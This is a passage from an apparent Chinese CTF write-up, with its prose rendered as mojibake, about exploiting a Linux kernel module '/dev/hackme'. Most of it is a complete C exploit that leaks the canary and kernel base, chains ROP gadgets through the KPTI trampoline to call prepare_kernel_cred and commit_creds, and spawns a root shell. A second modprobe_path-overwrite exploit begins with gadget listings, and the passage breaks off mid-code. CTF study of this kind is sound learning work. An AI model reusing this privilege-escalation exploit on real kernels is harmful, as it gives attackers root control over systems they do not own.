class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fn_rdi_ret_primitive</span><span class=\"params\">(<span class=\"type\">void</span> (*fn)(), u64 rdi, <span class=\"type\">void</span> (*ret)())</span>&#123;</span><br><span class=\"line\">  u64 payload[<span class=\"number\">0x40</span>];</span><br><span class=\"line\">  u64 off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rdi_rbp_ret;</span><br><span class=\"line\">  payload[off++] = rdi;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = fn;</span><br><span class=\"line\">  payload[off++] = kpti_trampoline;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rax</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rdi</span></span><br><span class=\"line\">  payload[off++] = ret;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;fn_rdi_ret_primitive&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™ç§åªè¦æœ‰èƒ½æ§åˆ¶ rdi çš„ gadget å°±è¡Œï¼Œ ç„¶åä¸¤ä¸ªåŸè¯­æ¯æ¬¡è¯»å‡ºæ¥çš„å€¼éƒ½ç”¨ rax ä¿å­˜åç”¨æ±‡ç¼–ç»™åˆ°æˆ‘ä»¬çš„æŒ‡å®šå¯„å­˜å™¨ã€‚<br>\nå¯¹äº <code>prepare_kernel_cred</code> , è¿”å›çš„æ˜¯ä¸€ä¸ª <code>cred</code>  ç»“æ„ä½“ï¼Œå¯ä»¥ç”¨ä¸´æ—¶å˜é‡å­˜å‚¨å³å¯ã€‚ç„¶åæ³¨æ„ä¸€ç‚¹ï¼Œrax å¼„å¥½äº†å°±åˆ«æ‰“å°è¾“å‡ºä¸œè¥¿äº†ï¼Œ<br>\nå¦åˆ™ä¼šæ¯åæ‰ rax çš„å†…å®¹ã€‚<br>\nè¿™é‡Œè¿˜ä¸€ä¸ªç–‘ç‚¹ï¼Œ <code>kpti_trampoline</code>  ä¹‹åæœ‰ä¸ª pop rax ï¼Œä¼šç ´åæ‰åŸè¯­åˆ›é€ çš„ rax</p>\n<h2 id=\"exp1\"><a class=\"markdownIt-Anchor\" href=\"#exp1\">#</a> exp1</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;include/head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 1024</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> u64;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> fd;</span><br><span class=\"line\">u64 write_addr, read_addr;</span><br><span class=\"line\">u64 user_cs,user_ss,user_sp,user_rflags;</span><br><span class=\"line\"><span class=\"type\">void</span> (*rfap)(<span class=\"type\">char</span> *, <span class=\"type\">void</span> (*)());</span><br><span class=\"line\"><span class=\"type\">void</span> (*frrp)(<span class=\"type\">void</span> (*)(), u64, <span class=\"type\">void</span> (*)());</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveState</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  __asm__ __volatile__ (</span><br><span class=\"line\">    <span class=\"string\">&quot;mov %cs, user_cs;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov %ss, user_ss;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;pop user_rflags;&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;saveState&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">open_dev</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  fd = open(<span class=\"string\">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fd &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Panic(<span class=\"string\">&quot;open_dev() failed&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;open_dev()&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// write to kernel</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">wtk</span><span class=\"params\">(<span class=\"type\">char</span> *buf, u64 size)</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;wtk start&quot;</span>);</span><br><span class=\"line\">  write(fd, buf, size);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;wtk&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// read from kernel</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">rfk</span><span class=\"params\">(<span class=\"type\">char</span> *buf, u64 size)</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;rfk start&quot;</span>);</span><br><span class=\"line\">  read(fd, buf, size);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;rfk&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getShell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;get shell now&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    Panic(<span class=\"string\">&quot;getShell failed&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 sh = (u64)getShell;</span><br><span class=\"line\"></span><br><span class=\"line\">u64 kernel_base                 = <span class=\"number\">0xffffffff80000000</span>;</span><br><span class=\"line\">u64 kpti_trampoline             = <span class=\"number\">0x200f10</span>+<span class=\"number\">22</span>;</span><br><span class=\"line\">u64 pop_rax_ret                 = <span class=\"number\">0x4d11</span>; <span class=\"comment\">// pop rax; ret</span></span><br><span class=\"line\">u64 read_mem_pop1_ret           = <span class=\"number\">0x4aae</span>; <span class=\"comment\">// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;</span></span><br><span class=\"line\">u64 pop_rdi_rbp_ret             = <span class=\"number\">0x38a0</span>; <span class=\"comment\">// pop rdi; pop rbp; ret;</span></span><br><span class=\"line\">u64 canary                      = <span class=\"number\">0</span>;</span><br><span class=\"line\">u64 ksymtab_prepare_kernel_cred = <span class=\"number\">0xf8d4fc</span>;</span><br><span class=\"line\">u64 ksymtab_commit_creds        = <span class=\"number\">0xf87d90</span>;</span><br><span class=\"line\">u64 tmp_rax;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">print_leak</span><span class=\"params\">(u64 *p, u64 n)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(u64 i = <span class=\"number\">0</span>; i &lt; n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(p[i] &amp; <span class=\"number\">0xffffffff81000000</span> == <span class=\"number\">0xffffffff81000000</span>)</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;p[%d] : 0x%lx\\n&quot;</span>, i, p[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">leak</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;leak&quot;</span>);</span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x300</span>];</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x1f0</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  kernel_base = ptr[<span class=\"number\">38</span>] - <span class=\"number\">0xa157</span>;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; kernel_base is 0x%lx&quot;</span>,kernel_base);</span><br><span class=\"line\">  u64 payload[<span class=\"number\">50</span>];</span><br><span class=\"line\">  pop_rdi_rbp_ret             += kernel_base;</span><br><span class=\"line\">  pop_rax_ret                 += kernel_base;</span><br><span class=\"line\">  read_mem_pop1_ret           += kernel_base;</span><br><span class=\"line\">  kpti_trampoline             += kernel_base;</span><br><span class=\"line\">  ksymtab_prepare_kernel_cred += kernel_base;</span><br><span class=\"line\">  ksymtab_commit_creds        += kernel_base;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;leak&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_from_addr_primitive</span><span class=\"params\">(<span class=\"type\">char</span> *addr, <span class=\"type\">void</span> (*f)())</span>&#123;</span><br><span class=\"line\">  u64 payload[<span class=\"number\">0x40</span>];</span><br><span class=\"line\">  u64 off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rax_ret;</span><br><span class=\"line\">  payload[off++] = addr - <span class=\"number\">0x10</span>;</span><br><span class=\"line\">  payload[off++] = read_mem_pop1_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy</span></span><br><span class=\"line\">  payload[off++] = kpti_trampoline;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rax</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rdi</span></span><br><span class=\"line\">  payload[off++] = f;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;read_from_addr_primitive&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fn_rdi_ret_primitive</span><span class=\"params\">(<span class=\"type\">void</span> (*fn)(), u64 rdi, <span class=\"type\">void</span> (*ret)())</span>&#123;</span><br><span class=\"line\">  u64 payload[<span class=\"number\">0x40</span>];</span><br><span class=\"line\">  u64 off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rdi_rbp_ret;</span><br><span class=\"line\">  payload[off++] = rdi;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = fn;</span><br><span class=\"line\">  payload[off++] = kpti_trampoline;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rax</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rdi</span></span><br><span class=\"line\">  payload[off++] = ret;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;fn_rdi_ret_primitive&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 pkc;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">get_cc_addr</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">get_pkc_addr</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  __asm__ __volatile__(</span><br><span class=\"line\">    <span class=\"string\">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov tmp_rax, rax;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;.att_syntax;&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  pkc = ksymtab_prepare_kernel_cred + (<span class=\"type\">int</span>)tmp_rax;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;   --&gt; pkc tmp_rax is 0x%x&quot;</span>,(<span class=\"type\">int</span>) tmp_rax);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; pkc is 0x%lx&quot;</span>, pkc);</span><br><span class=\"line\">  rfap(ksymtab_commit_creds, get_cc_addr);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;get_pkc_addr&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 cc;</span><br><span class=\"line\"><span class=\"comment\">// <span class=\"doctag\">TODO:</span> dont put any output in head to destory rax</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">done_pkc</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">get_cc_addr</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  __asm__ __volatile__(</span><br><span class=\"line\">    <span class=\"string\">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov tmp_rax, rax;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;.att_syntax;&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  cc = ksymtab_commit_creds + (<span class=\"type\">int</span>)tmp_rax;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;   --&gt; cc tmp_rax is 0x%x&quot;</span>,tmp_rax);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; cc is  0x%lx&quot;</span>, cc);</span><br><span class=\"line\">  frrp(pkc, <span class=\"literal\">NULL</span>, done_pkc);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;get_cc_addr&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 cc_struct;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">done_pkc</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  __asm__ __volatile__(</span><br><span class=\"line\">    <span class=\"string\">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov tmp_rax, rax;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;.att_syntax;&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  cc_struct = tmp_rax;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;   --&gt; cc_struct is 0x%lx&quot;</span>, cc_struct);</span><br><span class=\"line\">  frrp(cc, cc_struct, sh);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> (*rfap)(<span class=\"type\">char</span> *, <span class=\"type\">void</span> (*)()) = read_from_addr_primitive;</span><br><span class=\"line\"><span class=\"type\">void</span> (*frrp)(<span class=\"type\">void</span> (*)(), u64, <span class=\"type\">void</span> (*)()) = fn_rdi_ret_primitive;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  leak();</span><br><span class=\"line\">  rfap(ksymtab_prepare_kernel_cred, get_pkc_addr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"exp2\"><a class=\"markdownIt-Anchor\" href=\"#exp2\">#</a> exp2</h2>\n<ul>\n<li>modprobe_path ä¸å†èµ˜è¿°<br>\nè¿™ä¸ªæ˜¯.data èŠ‚çš„æ•°æ® åˆ°å†…æ ¸åŸºå€çš„åç§»ä¹Ÿæ˜¯ç¡®å®šçš„ï¼Œå¦å¤–å…ˆå‰ä¹ŸçŸ¥é“äº† memcpy åœ¨åç§»ä¸å˜çš„æ®µå†…ã€‚ROP è¦†å†™å³å¯</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/ # cat /proc/kallsyms | grep memcpy</span><br><span class=\"line\">ffffffff81007c60 T __memcpy_mcsafe</span><br><span class=\"line\">ffffffff8100dd60 T __memcpy</span><br><span class=\"line\">ffffffff8100dd60 W memcpy</span><br><span class=\"line\"></span><br><span class=\"line\">/ # cat /proc/kallsyms | grep modprobe_path</span><br><span class=\"line\">ffffffff82061820 D modprobe_path</span><br></pre></td></tr></table></figure>\n<p>ä¸è¿‡ç”±äº SMAP çš„ç¼˜æ•…ï¼Œmemcpy ä¸èƒ½ç”¨ï¼Œåªèƒ½æ‰¾å†™å…¥çš„ gadgetã€‚</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gefâ¤  x/<span class=\"number\">10</span>i <span class=\"number\">0x306d</span>+<span class=\"number\">0xffffffff81000000</span></span><br><span class=\"line\">   <span class=\"number\">0xffffffff8100306d</span>:  mov    QWORD PTR [rbx],rax</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003070</span>:  pop    rbx</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003071</span>:  pop    rbp</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003072</span>:  ret</span><br></pre></td></tr></table></figure>\n<p>è¿™æ ·å°±è¿˜éœ€è¦ä¸€ä¸ªæ§åˆ¶ rbx çš„ gadgetï¼Œrax å†™æˆ <code>/tmp/s</code> , rbx å†™æˆ modprobe_path çš„åœ°å€ï¼Œæ§åˆ¶ rax çš„ exp1 é‡Œå·²ç»æœ‰äº†ã€‚</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gefâ¤  x/<span class=\"number\">10</span>i <span class=\"number\">0x3190</span>+<span class=\"number\">0xffffffff81000000</span></span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003190</span>:  pop    rbx</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003191</span>:  pop    r12</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003193</span>:  pop    rbp</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81003194</span>:  ret</span><br></pre></td></tr></table></figure>\n<p>é‚£ä¹ˆ exp2 å°±å¾ˆç®€å•äº†ã€‚æ³¨æ„ <code>/tmp/s</code>  ä¸è¦å¤ªé•¿ ä¸ç„¶å°±å’Œåé¢çš„å­—ç¬¦ä¸²æ‹¼æ¥ä¸Šäº†</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span 